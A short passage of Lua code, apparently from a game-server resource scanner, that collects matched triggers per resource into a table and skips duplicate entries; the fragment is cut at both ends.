                    end
                    if matches then
                        for _, triggerInfo in ipairs(patternGroup.triggers) do
                            local isDuplicate = false
                            for _, existing in ipairs(foundTriggers[triggerInfo.type]) do
                                if existing.resource == resName and existing.trigger == triggerInfo.trigger then
                                    isDuplicate = true
                                    break
                                end
                            end
                            if not isDuplicate then
                                table.insert(foundTriggers[triggerInfo.type], {
                                    resource = resName,
                                    trigger = triggerInfo.trigger,
 ... (517 KB left)
